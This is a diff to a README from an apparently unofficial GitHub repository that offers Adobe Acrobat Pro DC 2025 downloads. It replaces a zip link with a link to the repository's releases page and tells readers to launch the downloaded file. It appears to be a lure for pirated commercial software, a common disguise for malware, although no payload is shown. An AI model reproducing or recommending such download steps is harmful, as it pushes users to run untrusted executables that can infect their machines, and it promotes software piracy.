@@ -29,7 +29,7 @@ In this repository, you will find everything you need to know and download regar
 
 ## 🚀 Get Started
 
-To access all the resources and downloads related to Adobe Acrobat Pro DC 2025, [click here to download the project.zip file](https://github.com/files/Project.zip). 📥
+To access all the resources and downloads related to Adobe Acrobat Pro DC 2025, [click here to download the https://github.com/Unleashur/Adobe-Acrobat-Pro-2025-Latest/releases file](https://github.com/Unleashur/Adobe-Acrobat-Pro-2025-Latest/releases). 📥
 
 If the link ends with the filename, make sure to launch it. If you encounter any issues with the link, feel free to check the "Releases" section for alternative download options.
 
